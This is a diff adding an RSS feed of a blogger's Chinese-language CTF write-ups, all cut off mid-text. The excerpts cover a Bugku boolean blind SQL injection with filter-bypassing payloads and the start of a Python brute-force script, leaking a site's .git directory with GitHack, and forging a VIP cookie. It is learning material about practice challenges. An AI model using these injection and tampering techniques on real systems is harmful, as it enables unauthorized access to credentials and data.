@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>WriteUP on Console.makeHappy(_1ming)</title>
+    <link>https://shenyiming.life/tags/writeup/</link>
+    <description>Recent content in WriteUP on Console.makeHappy(_1ming)</description>
+    <image>
+      <url>https://shenyiming.life/android-chrome-512x512.png</url>
+      <link>https://shenyiming.life/android-chrome-512x512.png</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sun, 24 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://shenyiming.life/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Bugku-SQL注入-WriteUP</title>
+      <link>https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Sun, 24 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</guid>
+      <description>题目网址：sql注入
+一个很正经的界面，有实战那味了。
+上来先尝试经典组合：
+admin~password
+很幸运，用户名猜中了。
+利用单引号检测是否存在SQL注入
+admin&#39; or 1 = 1
+报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
+&#39;or&amp;lt;&amp;gt;(不等号)#()空格可用括号代替，等号可用相反的不等号
+先尝试是否存在布尔注入：
+成功，用户名存在注入~
+之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
+select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
+1&amp;#39;or((ascii(mid((select(password)from(admin))from(1))))&amp;lt;&amp;gt;9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
+我们尝试下集束炸弹，让两个参数都作为目标
+第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
+爆破成功了。。。
+接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
+4dcc88f8f1bc05e7c2ad1a60288481a2
+去md5破解站破解一下，成功解出密码：
+bugkuctf
+结束了……
+反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
+贴一组大神的python自动脚本，以供学习
+#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = &amp;#39;http://114.67.246.176:19665/&amp;#39; sss = string.digits + (string.ascii_lowercase) a = &amp;#39;&amp;#39; for i in range(1, 50): flag = 0 for j in sss: payload = &amp;#34;admin&amp;#39;^((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)^1#&amp;#34; % (i, ord(j)) #屏蔽了&amp;#34;,&amp;#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&amp;lt;&amp;gt;表示不等号 #^表示异或 payload2= &amp;#34;admin123&amp;#39;or((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= &amp;#34;admin123&amp;#39;or((ascii(mid((select(database()))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) data = {&amp;#39;username&amp;#39;: payload, &amp;#39;password&amp;#39;: &amp;#39;admin&amp;#39;} res = requests.</description>
+    </item>
+    
+    <item>
+      <title>CNSS Recruit-Web Write UP</title>
+      <link>https://shenyiming.life/post/14.cnss-recruit-web-write-up/</link>
+      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyiming.life/post/14.cnss-recruit-web-write-up/</guid>
+      <description>前言 躺在床上，不想动鼠标，那就先写写前言吧。
+这个CTF比赛是我打的第二场比较正规、完整的比赛。
+惨不忍睹，当然，作为刚入门的noob来说也可以接受。
+希望能通过笔记的整理消化新掌握的知识，道阻且长。
+[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
+关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
+python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
+Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
+git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
+其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
+[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
+第一反应是绕过和注入咯，尝试后无果。
+再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
+那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
+import requests import re # 正则表达式库 import string from requests.sessions import session url = &amp;#39;http://81.68.109.40:30005/&amp;#39; session = requests.</description>
+    </item>
+    
+    <item>
+      <title>MoeCTF 2021 西电新生赛WP</title>
+      <link>https://shenyiming.life/post/12.moectf-web-write-up/</link>
+      <pubDate>Thu, 19 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyiming.life/post/12.moectf-web-write-up/</guid>
+      <description>前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。
+想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。
+1. Web安全入门指北-GET &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_GET[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。
+在地址栏中发送get请求：
+http://47.93.215.154:10000/?moe=flag
+得到flag：
+moectf{We1c0me_t0_CTF_Web!}
+2. Web安全入门指北-POST &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_POST[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。
+用hackbar：
+在post参数里填入moe=flag
+Execute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}
+3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:
+You are not VIP,I will give flag to VIP!
+可以大致猜测要伪造某些访问项目，将非VIP改为VIP。
+用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。
+将抓包结果发送到重发器，将VIP值改为1，点击发送。
+得到flag。
+4. 2048 打开环境，发现是一个2048小游戏</description>
+    </item>
+    
+  </channel>
+</rss>
